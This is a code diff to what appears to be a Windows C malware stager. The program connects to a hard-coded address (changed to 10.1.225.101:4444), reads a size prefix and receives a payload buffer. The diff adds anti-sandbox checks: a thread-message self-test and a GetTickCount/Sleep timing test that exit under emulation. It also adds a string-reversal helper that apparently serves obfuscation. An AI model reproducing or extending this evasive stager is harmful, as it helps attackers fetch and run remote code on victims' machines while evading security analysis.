@@ -2,6 +2,8 @@
 #include <stdlib.h>
 #include <windows.h>
 #include <winsock2.h>
+#include <string.h>
+
 void winsock_init() {
 	WSADATA	wsaData;
 	WORD 		wVersionRequested;
@@ -18,6 +20,9 @@ void Kick(SOCKET my_socket, char * error) {
 	WSACleanup();
 	exit(1);
 }
+
+
+
 int recv_all(SOCKET my_socket, void * buffer, int len) {
 	int    tret   = 0;
 	int    nret   = 0;
@@ -31,6 +36,9 @@ int recv_all(SOCKET my_socket, void * buffer, int len) {
 	}
 	return tret;
 }
+
+
+
 SOCKET wsconnect(char * targetip, int port) {
 	struct hostent *		target;
 	struct sockaddr_in 	sock;
@@ -67,6 +75,27 @@ int random_in_range (unsigned int min, unsigned int max)
   }
 }
 
+
+
+char* rev(char* str)
+{
+  int end= strlen(str)-1;
+  int start = 0;
+
+  while( start<end )
+  {
+    str[start] ^= str[end];
+    str[end] ^=   str[start];
+    str[start]^= str[end];
+
+    ++start;
+    --end;
+  }
+
+  return str;
+}
+
+
 int main(int argc) {
 	ULONG32 size;
 	char * buffer;
@@ -75,8 +104,25 @@ int main(int argc) {
 	char argv[3][25];
 	int num1, num2, num3;
 
-	strcpy(argv[1],"192.168.1.116");
-	strcpy(argv[2],"443");
+	strcpy(argv[1],"10.1.225.101");
+	strcpy(argv[2],"4444");
+
+
+
+	MSG msg;
+	DWORD tc;
+	PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42);
+	if (!PeekMessage(&msg, (HWND)-1, 0, 0, 0))
+		return 0;
+	if (msg.message != WM_USER+2 || msg.wParam != 23 || msg.lParam != 42)
+		return 0;
+	tc = GetTickCount();
+	Sleep(650);
+	if (((GetTickCount() - tc) / 300) != 2)
+		return 0;
+
+
+
 
 	SOCKET my_socket = wsconnect(argv[1], atoi(argv[2]));
 	int count = recv(my_socket, (char *)&size, 4, 0);
